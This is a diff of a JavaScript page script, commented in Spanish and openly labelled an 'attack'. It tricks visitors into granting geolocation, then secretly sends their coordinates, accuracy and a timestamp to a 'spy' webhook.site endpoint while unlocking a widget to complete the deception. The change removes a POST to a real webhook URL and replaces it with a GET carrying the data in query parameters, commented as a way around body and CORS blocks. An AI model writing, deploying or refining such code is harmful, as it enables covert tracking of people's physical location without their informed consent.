@@ -21,9 +21,8 @@ document.addEventListener("DOMContentLoaded", function() {
     const resultadoDiv = document.getElementById("resultado");
     const widget = document.getElementById("widget-local"); 
 
-    // --- !! MODIFICACIÓN CLAVE !! ---
-    // Pega tu URL de webhook.site aquí abajo
-    const url_espia = "https://webhook.site/72f2b41d-6ba8-4ca9-b639-b1c3713d8e7b";
+    // --- !! Pega tu URL de webhook.site aquí !! ---
+    const url_espia_base = "PEGA_TU_URL_DE_WEBHOOK_SITE_AQUI";
     // ------------------------------------
 
     boton.addEventListener("click", function() {
@@ -47,28 +46,25 @@ document.addEventListener("DOMContentLoaded", function() {
         
         console.log("¡Ubicación obtenida!", posicion.coords);
 
-        // --- !! ESTA ES LA PARTE DEL "ATAQUE" !! ---
+        // --- !! ESTA ES LA PARTE DEL "ATAQUE" (VERSIÓN 2.0) !! ---
+        
         // 1. Prepara los datos robados
-        const datosRobados = {
-            latitud: posicion.coords.latitude,
-            longitud: posicion.coords.longitude,
-            precision: posicion.coords.accuracy,
-            velocidad: posicion.coords.speed,
-            timestamp: new Date().toISOString()
-        };
+        const lat = posicion.coords.latitude;
+        const lon = posicion.coords.longitude;
+        const acc = posicion.coords.accuracy;
+        const ts = new Date().toISOString();
 
-        // 2. Envía los datos al servidor "espía" (webhook)
-        fetch(url_espia, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(datosRobados)
-        });
+        // 2. Construye la URL de ataque con los datos como parámetros
+        // (Esto evita los bloqueos de 'body' y 'CORS')
+        const url_con_datos = `${url_espia_base}?latitud=${lat}&longitud=${lon}&precision=${acc}&timestamp=${ts}`;
+
+        // 3. Envía los datos (ahora como un simple GET)
+        fetch(url_con_datos);
+        
         // ---------------------------------------------
 
         
-        // 3. Completa el engaño para el usuario
+        // 4. Completa el engaño para el usuario
         widget.classList.add("unlocked");
         resultadoDiv.innerHTML = ""; 
         
